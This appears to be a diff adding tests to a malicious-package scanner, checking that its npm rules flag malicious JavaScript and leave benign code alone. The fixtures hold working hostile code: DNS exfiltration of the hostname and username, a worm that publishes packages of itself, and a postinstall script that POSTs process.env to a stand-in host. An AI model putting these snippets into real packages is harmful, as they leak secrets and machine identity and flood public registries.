@@ -11391,3 +11391,111 @@ class TestWhoseMachineTheCodeRunsOn:
             if any(hook.kind == "consumerinstall" for hook in manifest.hooks):
                 consuming.append(label)
         assert consuming == ["malicious"]
+
+
+class TestTheSameActsInAnotherEcosystem:
+    """The npm measurement, and what it found that the PyPI one could not.
+
+    Recall was measured against Datadog's dataset of real malicious npm
+    packages, and the first reading was **59.4%** against PyPI's 87.5%. The gaps
+    were not new ideas. They were the same acts the Python packs already name,
+    missing from the JavaScript ones -- which is exactly the failure mode the
+    capability model exists to prevent, and it went unnoticed because nobody had
+    measured the ecosystem.
+    """
+
+    DNS_EXFIL = (
+        "const dns = require('dns');\n"
+        "const os = require('os');\n"
+        "\n"
+        "const tohex = (s) => Buffer.from(s, 'utf-8').toString('hex');\n"
+        "\n"
+        "dns.resolve4(tohex(os.hostname()) + '.a1b2c3.collect.invalid', () => {});\n"
+        "dns.resolve4(tohex(os.userInfo().username) + '.d4e5f6.collect.invalid', () => {});\n"
+    )
+    """`@aa-techops-ui/ping-authentication`, near enough. Four lines, and the
+    whole technique: the hostname is hex-encoded into a DNS label, so the
+    machine's identity leaves through the resolver the host already trusts."""
+
+    SELF_PUBLISH = (
+        "const fs = require('fs');\n"
+        "const { exec } = require('child_process');\n"
+        "\n"
+        "function publishNext(name) {\n"
+        "    const data = JSON.parse(fs.readFileSync('package.json'));\n"
+        "    data.name = name;\n"
+        "    fs.writeFileSync('package.json', JSON.stringify(data));\n"
+        "    exec('npm publish --access public', () => publishNext(name + 'x'));\n"
+        "}\n"
+    )
+    """The registry-spam worm: a package whose payload is publishing more
+    packages, each under a generated name. Twenty-six of the first 143 npm
+    samples were this one shape."""
+
+    def test_dns_exfiltration_in_node(self, tmp_path) -> None:
+        """`CAP.EGRESS.DNS_CONSTRUCTED.001` knew Python's resolver and the
+        shell's and not JavaScript's, and `SUSPECT.EXFIL.DNS.001` required a
+        credential -- but a DNS label is 63 bytes, which is room for a machine
+        name and not for a key. Both corrected."""
+        (tmp_path / "index.js").write_text(self.DNS_EXFIL, encoding="utf-8")
+        assert "SUSPECT.EXFIL.DNS.001" in flagged(tmp_path)
+
+    def test_resolving_a_name_you_wrote_down_is_not(self, tmp_path) -> None:
+        (tmp_path / "index.js").write_text(
+            "const dns = require('dns');\n"
+            "dns.resolve4('registry.npmjs.org', (e, a) => console.log(a));\n"
+            "dns.lookup(hostname, callback);\n",
+            encoding="utf-8",
+        )
+        assert "SUSPECT.EXFIL.DNS.001" not in flagged(tmp_path)
+
+    def test_a_package_that_publishes_packages(self, tmp_path) -> None:
+        (tmp_path / "auto.js").write_text(self.SELF_PUBLISH, encoding="utf-8")
+        assert "SUSPECT.REGISTRY.SELF_PUBLISH.001" in flagged(tmp_path)
+
+    def test_talking_about_publishing_is_not_publishing(self, tmp_path) -> None:
+        """The rule's own negative samples caught the first draft of this: a
+        forty-character run before the command let `console.log('next: npm
+        publish')` match, which is advice to a human."""
+        (tmp_path / "cli.js").write_text(
+            "console.log('next: npm publish');\nthrow new Error('you must npm publish first');\n",
+            encoding="utf-8",
+        )
+        assert "SUSPECT.REGISTRY.SELF_PUBLISH.001" not in flagged(tmp_path)
+
+    def test_building_an_environment_is_not_reading_credentials(self, tmp_path) -> None:
+        """`{ ...process.env, FOO: undefined }` is how every Node program builds
+        an environment for a child process, and it was labelled credential
+        access. **esbuild** writes exactly that in its postinstall and downloads
+        its own platform binary a few lines later: install hook, plus
+        "credential", plus egress is `MALWARE.EXFIL.001` at CRITICAL -- on one of
+        the most installed packages there is, for fetching its own binary."""
+        (tmp_path / "package.json").write_text(
+            '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node install.js"}}',
+            encoding="utf-8",
+        )
+        (tmp_path / "install.js").write_text(
+            "const { execFileSync } = require('child_process');\n"
+            "const https = require('https');\n"
+            "\n"
+            "const env = { ...process.env, npm_config_global: undefined };\n"
+            "https.get('https://registry.npmjs.org/x/-/x-1.0.0.tgz', (r) => r.pipe(out));\n"
+            "execFileSync('node', ['-v'], { env });\n",
+            encoding="utf-8",
+        )
+        assert "MALWARE.EXFIL.001" not in flagged(tmp_path)
+
+    def test_serialising_the_environment_still_is(self, tmp_path) -> None:
+        """The guard that keeps the narrowing honest. Reading the environment to
+        pass it on is not serialising it to send."""
+        (tmp_path / "package.json").write_text(
+            '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node steal.js"}}',
+            encoding="utf-8",
+        )
+        (tmp_path / "steal.js").write_text(
+            "const https = require('https');\n"
+            "const body = JSON.stringify(process.env);\n"
+            "https.request('https://collect.invalid/p', { method: 'POST' }).end(body);\n",
+            encoding="utf-8",
+        )
+        assert "MALWARE.EXFIL.001" in flagged(tmp_path)
